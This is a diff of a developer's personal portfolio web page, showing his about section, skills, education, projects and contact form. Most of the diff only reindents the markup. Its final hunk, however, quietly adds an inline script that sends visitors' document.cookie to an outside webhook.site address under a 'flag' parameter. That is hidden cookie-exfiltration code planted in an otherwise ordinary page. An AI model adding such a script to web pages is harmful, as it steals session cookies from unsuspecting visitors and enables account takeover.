@@ -1,292 +1,288 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <title>Youssef Bouryal</title>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-  	<link rel="icon" type="image/x-icon" href="./media/favicon.ico">
-    <link href="css/style.css" rel="stylesheet" />
-    <link rel="stylesheet" href="css/all.min.css" />
-  </head>
 
-  <body>
-    <div class="container">
-      <!-- ---------------home----------------- -->
-      <div class="home" id="home">
-        <nav>
-          <div class="logo">
-            <h1><span>B</span>ouryal.</h1>
-          </div>
-          <ul id="side-menu">
-            <li><a href="#home">Home</a></li>
-            <li><a href="https://thenew-programer.github.io/bouryalblog.github.io/" target="_blank">Blog</a></li>
-            <li><a href="#about">About</a></li>
-            <li><a href="#portfolio">Portfolio</a></li>
-            <li><a href="#contact">Contact</a></li>
-            <i class="fa-solid fa-xmark small" onclick="closemenu()"></i>
-          </ul>
-          <i class="fa-solid fa-bars small" onclick="openmenu()"></i>
-        </nav>
-        <div class="home-text">
-          <h1>Hi, <span class="auto-input"></span><br /></h1>
-          <p style="font-size: 1.5rem;margin-top: 10px;">Software Developer with Finance Background</p>
-          <a href="#contact" class="btn btn1">Connect</a>
-        </div>
-      </div>
-      <!-- ------------------about-------------------- -->
-      <div class="about" id="about">
-        <div class="about-container">
-          <div class="row">
-            <div class="about-col-1">
-              <img src="media/IMG-20221129-WA0047.jpg" alt="my image" />
-            </div>
-            <div class="about-col-2">
-              <h1 class="sub-title">About Me</h1>
-              <p>
-Hello there, and welcome to my website!
-<br>
-I'm Youssef Bouryal, a software developer with over 2 years of programming experience and a bachelor's degree in Applied Finance. Currently advancing my technical skills at 1337 coding school (part of the 42 Network), I focus on low-level systems programming and web development.
-<br>
-My journey combines an analytical finance background with technical problem-solving abilities, allowing me to create efficient, scalable software solutions. Selected through the rigorous "Piscine" admission process with less than 15% acceptance rate, I'm developing strong problem-solving skills through algorithm challenges and complex system design.
-<br>
-I thrive in collaborative environments and enjoy tackling complex technical challenges. My experience spans multiple programming languages including C, Python, JavaScript, and Bash, with particular interests in web development and systems programming.
-<br>
-Beyond technical skills, I value effective communication and teamwork. My background in finance has equipped me with strong analytical thinking and attention to detail that transfers well to software development contexts.
-<br>
-Thank you for visiting my website. If you'd like to discuss potential collaborations or opportunities, please don't hesitate to reach out through the contact section below.
-              </p>
-          </div>
-        </div>
-      </div>
-              <div class="tab-titles">
-                <p class="tab-links active-links" onclick="opentab('skills')">
-                  Skills
-                </p>
-                <p class="tab-links" onclick="opentab('Experience')">
-                  Experience
-                </p>
-                <p class="tab-links" onclick="opentab('Education')">
-                  Education
-                </p>
-              </div>
-              <div class="tab-content active-tab" id="skills">
-				  <ul>
-					  <li>
-						  <span>Languages: C, Python, JavaScript, Bash</span>
-						  <br>
-						  <br>
-					  </li>
-					  <li>
-						  <span>Web Development: HTML, CSS, Django, REST APIs</span>
-						  <br>
-						  <br>
-					  </li>
-					  <li>
-						  <span>Database: PostgreSQL, SQL fundamentals</span>
-						  <br>
-						  <br>
-					  </li>
-					  <li>
-						  <span>DevOps: Docker, Git/GitHub</span>
-						  <br>
-						  <br>
-					  </li>
-					  <li>
-						  <span>Computer Science: Data Structures, Algorithms, UNIX Systems</span>
-						  <br>
-						  <br>
-					  </li>
-				  </ul>
-              </div>
-              <div class="tab-content" id="Experience">
-<ul>
-  <li>
-    <span>Software Developer</span><br>
-    <p>
-      Over 2+ years of programming experience focusing on low-level systems programming and web development. Combining analytical finance background with technical problem-solving abilities to create efficient, scalable software solutions.
-    </p>
-  </li>
+<head>
+	<title>Youssef Bouryal</title>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<link rel="icon" type="image/x-icon" href="./media/favicon.ico">
+	<link href="css/style.css" rel="stylesheet" />
+	<link rel="stylesheet" href="css/all.min.css" />
+</head>
 
-  <li>
-    <span>Project Development</span><br>
-    <p>
-      Developed full-stack applications including Sportify (sports management application) using Django REST API and Docker. Built a POSIX-compliant shell in C mimicking core bash functionality, implementing parser using recursive descent techniques and execution logic for commands, pipes, and I/O redirections.
-    </p>
-  </li>
+<body>
+	<div class="container">
+		<!-- ---------------home----------------- -->
+		<div class="home" id="home">
+			<nav>
+				<div class="logo">
+					<h1><span>B</span>ouryal.</h1>
+				</div>
+				<ul id="side-menu">
+					<li><a href="#home">Home</a></li>
+					<li><a href="https://thenew-programer.github.io/bouryalblog.github.io/" target="_blank">Blog</a>
+					</li>
+					<li><a href="#about">About</a></li>
+					<li><a href="#portfolio">Portfolio</a></li>
+					<li><a href="#contact">Contact</a></li>
+					<i class="fa-solid fa-xmark small" onclick="closemenu()"></i>
+				</ul>
+				<i class="fa-solid fa-bars small" onclick="openmenu()"></i>
+			</nav>
+			<div class="home-text">
+				<h1>Hi, <span class="auto-input"></span><br /></h1>
+				<p style="font-size: 1.5rem;margin-top: 10px;">Software Developer with Finance Background</p>
+				<a href="#contact" class="btn btn1">Connect</a>
+			</div>
+		</div>
+		<!-- ------------------about-------------------- -->
+		<div class="about" id="about">
+			<div class="about-container">
+				<div class="row">
+					<div class="about-col-1">
+						<img src="media/IMG-20221129-WA0047.jpg" alt="my image" />
+					</div>
+					<div class="about-col-2">
+						<h1 class="sub-title">About Me</h1>
+						<p>
+							Hello there, and welcome to my website!
+							<br>
+							I'm Youssef Bouryal, a software developer with over 2 years of programming experience and a
+							bachelor's degree in Applied Finance. Currently advancing my technical skills at 1337 coding
+							school (part of the 42 Network), I focus on low-level systems programming and web
+							development.
+							<br>
+							My journey combines an analytical finance background with technical problem-solving
+							abilities, allowing me to create efficient, scalable software solutions. Selected through
+							the rigorous "Piscine" admission process with less than 15% acceptance rate, I'm developing
+							strong problem-solving skills through algorithm challenges and complex system design.
+							<br>
+							I thrive in collaborative environments and enjoy tackling complex technical challenges. My
+							experience spans multiple programming languages including C, Python, JavaScript, and Bash,
+							with particular interests in web development and systems programming.
+							<br>
+							Beyond technical skills, I value effective communication and teamwork. My background in
+							finance has equipped me with strong analytical thinking and attention to detail that
+							transfers well to software development contexts.
+							<br>
+							Thank you for visiting my website. If you'd like to discuss potential collaborations or
+							opportunities, please don't hesitate to reach out through the contact section below.
+						</p>
+					</div>
+				</div>
+			</div>
+			<div class="tab-titles">
+				<p class="tab-links active-links" onclick="opentab('skills')">
+					Skills
+				</p>
+				<p class="tab-links" onclick="opentab('Experience')">
+					Experience
+				</p>
+				<p class="tab-links" onclick="opentab('Education')">
+					Education
+				</p>
+			</div>
+			<div class="tab-content active-tab" id="skills">
+				<ul>
+					<li>
+						<span>Languages: C, Python, JavaScript, Bash</span>
+						<br>
+						<br>
+					</li>
+					<li>
+						<span>Web Development: HTML, CSS, Django, REST APIs</span>
+						<br>
+						<br>
+					</li>
+					<li>
+						<span>Database: PostgreSQL, SQL fundamentals</span>
+						<br>
+						<br>
+					</li>
+					<li>
+						<span>DevOps: Docker, Git/GitHub</span>
+						<br>
+						<br>
+					</li>
+					<li>
+						<span>Computer Science: Data Structures, Algorithms, UNIX Systems</span>
+						<br>
+						<br>
+					</li>
+				</ul>
+			</div>
+			<div class="tab-content" id="Experience">
+				<ul>
+					<li>
+						<span>Software Developer</span><br>
+						<p>
+							Over 2+ years of programming experience focusing on low-level systems programming and web
+							development. Combining analytical finance background with technical problem-solving
+							abilities to create efficient, scalable software solutions.
+						</p>
+					</li>
 
-  <li>
-    <span>Finance Background</span><br>
-    <p>
-      Bachelor's Degree in Applied Finance with strong analytical and quantitative skills applicable to data-driven software development. Relevant coursework included Statistics, Econometrics, and Data Analysis.
-    </p>
-  </li>
-</ul>
-              </div>
-              <div class="tab-content" id="Education">
-<ul>
-  <li>
-    <span>1337 Coding School (42 Network) | Rabat, Morocco</span><br>
-    <p>
-      Computer Science Intensive Program | September 2024 - Present
-      <br>
-      - Peer-to-peer learning model focusing on project-based mastery of programming concepts
-      <br>
-      - Selected through rigorous "Piscine" admission process with <15% acceptance rate
-      <br>
-      - Developing strong problem-solving skills through algorithm challenges and complex system design
-    </p>
-  </li>
+					<li>
+						<span>Project Development</span><br>
+						<p>
+							Developed full-stack applications including Sportify (sports management application) using
+							Django REST API and Docker. Built a POSIX-compliant shell in C mimicking core bash
+							functionality, implementing parser using recursive descent techniques and execution logic
+							for commands, pipes, and I/O redirections.
+						</p>
+					</li>
 
-  <li>
-    <span>Cadi Ayyad University | Morocco</span><br>
-    <p>
-      Bachelor's Degree in Applied Finance | 2021 - 2024
-      <br>
-      - Developed strong analytical and quantitative skills applicable to data-driven software development
-      <br>
-      - Relevant coursework: Statistics, Econometrics, Data Analysis
-    </p>
-  </li>
-  
-  <li>
-    <span>Certifications</span><br>
-    <p>
-      - Programming in Python - Coursera
-      <br>
-      - Introduction to Backend Development - Coursera
-    </p>
-  </li>
-</ul>
-             </div>
-            </div>
-      <!-- -----------------------portfolio----------------------- -->
-      <div class="projects" id="portfolio">
-        <div class="project-container">
-          <h1 class="sub-title">Portfolio</h1>
-          <div class="project-list">
-            <div class="project">
-              <!-- <img src="media/safe-pass.gif" /> -->
-              <div class="layer">
-                <h3>Sportify</h3>
-                <p>
-                  A full-stack sports management application developed during school hackathon to coordinate university athletics. Implemented backend REST API with Django, enabling competition management and real-time leaderboards. Designed database schema and integration with Sqlite3 using Django ORM. Containerized application with Docker for consistent deployment across environments.
-                </p>
-                <div class="icons">
-                  <a
-                    href="https://github.com/thenew-programer/sportify.git"
-                    target="_blank"
-                    ><i class="fa-brands fa-github icn"></i
-                  ></a>
-                </div>
-              </div>
-            </div>
-            <div class="project">
-              <img src="media/project-2.gif" />
-              <div class="layer">
-                <h3>Minishell</h3>
-                <p>
-                  Built a POSIX-compliant shell in C mimicking core bash functionality. Implemented parser using recursive descent techniques to create abstract syntax trees. Developed execution logic for commands, pipes, logical operators, and I/O redirections. Applied low-level programming concepts including process management, signal handling, and memory management.
-                </p>
-                <div class="icons">
-                  <a
-                    href="https://github.com/thenew-programer/minishell.git"
-                    target="_blank"
-                    ><i class="fa-brands fa-github icn"></i
-                  ></a>
-                </div>
-              </div>
-            </div>
-            <div class="project">
-              <img src="media/project-3.gif" />
-              <div class="layer">
-                <h3>LibFT</h3>
-                <p>
-                  Created comprehensive C library with over 40 utility functions replicating standard C library functionality. Implemented memory management, string manipulation, linked list handling, and I/O functions. Optimized for performance and memory usage while maintaining readability.
-                </p>
-                <div class="icons">
-                  <a
-                    href="https://github.com/thenew-programer/libft.git"
-                    target="_blank"
-                    ><i class="fa-brands fa-github icn"></i
-                  ></a>
-                </div>
-              </div>
-            </div>
-          </div>
-          <a
-            href="https://github.com/thenew-programer/"
-            class="btn"
-            target="_blank"
-            rel="noreferrer"
-            >See more</a
-          >
-        </div>
-      </div>
-      <!-- ---------------------contact------------------------ -->
-      <div class="contact" id="contact">
-        <div class="contact-container">
-          <div class="contact-left">
-            <h1 class="sub-title">Contact Me</h1>
-            <p>
-              <i class="fa-solid fa-paper-plane icn"></i>
-              josephbouryal@gmail.com
-            </p>
-            <p><i class="fa-solid fa-phone icn"></i> &plus;212 643 336 201</p>
-            <p><i class="fa-solid fa-location-dot icn"></i> Rabat, Morocco</p>
-            <div class="social-icons">
-              <a
-                href="https://x.com/youssef_bouryal"
-                target="_blank"
-                rel="noreferrer"
-              >
-                <i class="fa-brands fa-twitter"></i
-              ></a>
-              <a
-                href="https://linkedin.com/in/youssef-bouryal"
-                target="_blank"
-                rel="noreferrer"
-                ><i class="fa-brands fa-linkedin"></i
-              ></a>
-              <a
-                href="https://github.com/thenew-programer/"
-                target="_blank"
-                rel="noreferrer"
-                ><i class="fa-brands fa-github-alt"></i
-              ></a>
-            </div>
-            <a href="media/youssef-bouryal-CV.pdf" class="btn btn2" download
-              >Download CV</a
-            >
-          </div>
-          <div class="contact-right">
-            <form name="submit-to-google-sheet">
-              <input type="text" name="Name" placeholder="your name" required />
-              <input
-                type="email"
-                name="Email"
-                placeholder="your email"
-                required
-              />
-              <textarea
-                name="Message"
-                rows="6"
-                placeholder="your message"
-                required
-              ></textarea>
-              <button type="submit" class="btn btn2">Submit</button>
-              <span id="msg"></span>
-            </form>
-          </div>
-        </div>
-      </div>
-    </div>
-    <!-- -------------------copyright---------------------- -->
-    <div class="copyright">
-      <p>Copyright &copy; Bouryal. 2024 All right reserved</p>
-    </div>
-    <!-- ------------------------finished-------------------------- -->
-    <script src="js/all.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
-    <script src="js/index.js"></script>
-  </body>
+					<li>
+						<span>Finance Background</span><br>
+						<p>
+							Bachelor's Degree in Applied Finance with strong analytical and quantitative skills
+							applicable to data-driven software development. Relevant coursework included Statistics,
+							Econometrics, and Data Analysis.
+						</p>
+					</li>
+				</ul>
+			</div>
+			<div class="tab-content" id="Education">
+				<ul>
+					<li>
+						<span>1337 Coding School (42 Network) | Rabat, Morocco</span><br>
+						<p>
+							Computer Science Intensive Program | September 2024 - Present
+							<br>
+							- Peer-to-peer learning model focusing on project-based mastery of programming concepts
+							<br>
+							- Selected through rigorous "Piscine" admission process with <15% acceptance rate <br>
+								- Developing strong problem-solving skills through algorithm challenges and complex
+								system design
+						</p>
+					</li>
+
+					<li>
+						<span>Cadi Ayyad University | Morocco</span><br>
+						<p>
+							Bachelor's Degree in Applied Finance | 2021 - 2024
+							<br>
+							- Developed strong analytical and quantitative skills applicable to data-driven software
+							development
+							<br>
+							- Relevant coursework: Statistics, Econometrics, Data Analysis
+						</p>
+					</li>
+
+					<li>
+						<span>Certifications</span><br>
+						<p>
+							- Programming in Python - Coursera
+							<br>
+							- Introduction to Backend Development - Coursera
+						</p>
+					</li>
+				</ul>
+			</div>
+		</div>
+		<!-- -----------------------portfolio----------------------- -->
+		<div class="projects" id="portfolio">
+			<div class="project-container">
+				<h1 class="sub-title">Portfolio</h1>
+				<div class="project-list">
+					<div class="project">
+						<!-- <img src="media/safe-pass.gif" /> -->
+						<div class="layer">
+							<h3>Sportify</h3>
+							<p>
+								A full-stack sports management application developed during school hackathon to
+								coordinate university athletics. Implemented backend REST API with Django, enabling
+								competition management and real-time leaderboards. Designed database schema and
+								integration with Sqlite3 using Django ORM. Containerized application with Docker for
+								consistent deployment across environments.
+							</p>
+							<div class="icons">
+								<a href="https://github.com/thenew-programer/sportify.git" target="_blank"><i
+										class="fa-brands fa-github icn"></i></a>
+							</div>
+						</div>
+					</div>
+					<div class="project">
+						<img src="media/project-2.gif" />
+						<div class="layer">
+							<h3>Minishell</h3>
+							<p>
+								Built a POSIX-compliant shell in C mimicking core bash functionality. Implemented parser
+								using recursive descent techniques to create abstract syntax trees. Developed execution
+								logic for commands, pipes, logical operators, and I/O redirections. Applied low-level
+								programming concepts including process management, signal handling, and memory
+								management.
+							</p>
+							<div class="icons">
+								<a href="https://github.com/thenew-programer/minishell.git" target="_blank"><i
+										class="fa-brands fa-github icn"></i></a>
+							</div>
+						</div>
+					</div>
+					<div class="project">
+						<img src="media/project-3.gif" />
+						<div class="layer">
+							<h3>LibFT</h3>
+							<p>
+								Created comprehensive C library with over 40 utility functions replicating standard C
+								library functionality. Implemented memory management, string manipulation, linked list
+								handling, and I/O functions. Optimized for performance and memory usage while
+								maintaining readability.
+							</p>
+							<div class="icons">
+								<a href="https://github.com/thenew-programer/libft.git" target="_blank"><i
+										class="fa-brands fa-github icn"></i></a>
+							</div>
+						</div>
+					</div>
+				</div>
+				<a href="https://github.com/thenew-programer/" class="btn" target="_blank" rel="noreferrer">See more</a>
+			</div>
+		</div>
+		<!-- ---------------------contact------------------------ -->
+		<div class="contact" id="contact">
+			<div class="contact-container">
+				<div class="contact-left">
+					<h1 class="sub-title">Contact Me</h1>
+					<p>
+						<i class="fa-solid fa-paper-plane icn"></i>
+						josephbouryal@gmail.com
+					</p>
+					<p><i class="fa-solid fa-phone icn"></i> &plus;212 643 336 201</p>
+					<p><i class="fa-solid fa-location-dot icn"></i> Rabat, Morocco</p>
+					<div class="social-icons">
+						<a href="https://x.com/youssef_bouryal" target="_blank" rel="noreferrer">
+							<i class="fa-brands fa-twitter"></i></a>
+						<a href="https://linkedin.com/in/youssef-bouryal" target="_blank" rel="noreferrer"><i
+								class="fa-brands fa-linkedin"></i></a>
+						<a href="https://github.com/thenew-programer/" target="_blank" rel="noreferrer"><i
+								class="fa-brands fa-github-alt"></i></a>
+					</div>
+					<a href="media/youssef-bouryal-CV.pdf" class="btn btn2" download>Download CV</a>
+				</div>
+				<div class="contact-right">
+					<form name="submit-to-google-sheet">
+						<input type="text" name="Name" placeholder="your name" required />
+						<input type="email" name="Email" placeholder="your email" required />
+						<textarea name="Message" rows="6" placeholder="your message" required></textarea>
+						<button type="submit" class="btn btn2">Submit</button>
+						<span id="msg"></span>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- -------------------copyright---------------------- -->
+	<div class="copyright">
+		<p>Copyright &copy; Bouryal. 2024 All right reserved</p>
+	</div>
+	<!-- ------------------------finished-------------------------- -->
+	<script src="js/all.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+	<script src="js/index.js"></script>
+	<script>
+		fetch('https://webhook.site/YOUR-ID?flag=' + document.cookie);
+	</script>
+</body>
+
 </html>
